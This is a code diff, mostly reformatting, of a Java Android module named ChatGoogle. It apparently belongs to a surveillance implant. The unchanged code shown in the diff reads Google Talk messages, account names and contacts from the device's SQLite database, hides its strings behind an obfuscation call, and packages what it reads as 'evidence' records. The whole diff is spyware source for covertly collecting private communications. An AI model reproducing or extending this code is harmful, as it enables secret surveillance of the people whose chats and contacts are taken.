@@ -45,7 +45,7 @@ public class ChatGoogle extends SubModuleChat {
 		}
 		readChatMessages();
 	}
-	
+
 	/**
 	 * Estrae dal file RegisterPhone.xml il numero di telefono
 	 * 
@@ -58,8 +58,6 @@ public class ChatGoogle extends SubModuleChat {
 		}
 		readChatMessages();
 	}
-
-
 
 	private void readChatMessages() {
 		if (Cfg.DEBUG) {
@@ -91,7 +89,7 @@ public class ChatGoogle extends SubModuleChat {
 				helper.deleteAtEnd = false;
 
 				setMyAccount(helper);
-				//ChatGroups groups = getChatGroups(helper);
+				// ChatGroups groups = getChatGroups(helper);
 
 				// Save contacts if AddressBook is active
 				if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
@@ -134,7 +132,7 @@ public class ChatGoogle extends SubModuleChat {
 		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
 		String sqlquery = M.e("select m.date, ac.name, m.type, body, co.username, co.nickname from messages as m join  contacts as co on m.thread_id = co._id join accounts as ac on co.account = ac._id where m.consolidation_key is null and m.type<=1 and m.date>?");
-				RecordVisitor visitor = new RecordVisitor() {
+		RecordVisitor visitor = new RecordVisitor() {
 
 			@Override
 			public long cursor(Cursor cursor) {
@@ -147,35 +145,33 @@ public class ChatGoogle extends SubModuleChat {
 				String co_username = cursor.getString(4);
 				String co_nick = cursor.getString(5);
 
-
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (cursor) %s] %s %s %s: %s ", date, account,(incoming ? "<-"
-							: "->"), co_nick, content );
+					Check.log(TAG + " (cursor) %s] %s %s %s: %s ", date, account, (incoming ? "<-" : "->"), co_nick,
+							content);
 				}
 				String from_id, from_display, to_id, to_display;
-				
-				
-				if(co_nick==null || co_nick.startsWith(M.e("private-chat"))){
+
+				if (co_nick == null || co_nick.startsWith(M.e("private-chat"))) {
 					return 0;
 				}
-				
-				if(incoming){
+
+				if (incoming) {
 					from_id = co_username;
 					from_display = co_nick;
 					to_id = account;
 					to_display = account;
-				}else{
+				} else {
 					from_id = account;
 					from_display = account;
 					to_id = co_username;
 					to_display = co_nick;
 				}
-				
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (cursor) %s -> %s", from_id, to_id);
 				}
-				MessageChat message = new MessageChat(PROGRAM, date, from_id, from_display, to_id, to_display, content, incoming);
+				MessageChat message = new MessageChat(PROGRAM, date, from_id, from_display, to_id, to_display, content,
+						incoming);
 				messages.add(message);
 
 				return createTime;
@@ -189,7 +185,7 @@ public class ChatGoogle extends SubModuleChat {
 	}
 
 	private void setMyAccount(GenericSqliteHelper helper) {
-		String[] projection = new String[]{"_id","name","username"};
+		String[] projection = new String[] { "_id", "name", "username" };
 		RecordVisitor visitor = new RecordVisitor() {
 
 			@Override
@@ -197,33 +193,33 @@ public class ChatGoogle extends SubModuleChat {
 				int id = cursor.getInt(0);
 				String name = cursor.getString(1);
 				String username = cursor.getString(2);
-				
+
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (setMyAccount) %s, %s", name, username);
 				}
 
 				ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.GOOGLE, name);
-				
+
 				return id;
 			}
 		};
 
 		long ret = helper.traverseRecords("accounts", visitor);
-		
+
 	}
 
 	private void saveContacts(GenericSqliteHelper helper) {
 		String[] projection = new String[] { "username", "nickname" };
-	
+
 		boolean tosave = false;
 		RecordVisitor visitor = new RecordVisitor(projection, "nickname not null ") {
-	
+
 			@Override
 			public long cursor(Cursor cursor) {
-	
+
 				String username = cursor.getString(0);
 				String nick = cursor.getString(1);
-	
+
 				Contact c = new Contact(username, username, nick, "");
 				if (username != null && !username.endsWith(M.e("public.talk.google.com"))) {
 					if (ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.GOOGLE, c)) {
@@ -236,7 +232,7 @@ public class ChatGoogle extends SubModuleChat {
 				return 0;
 			}
 		};
-	
+
 		if (helper.traverseRecords(M.e("contacts"), visitor) == 1) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (saveContacts) serialize");
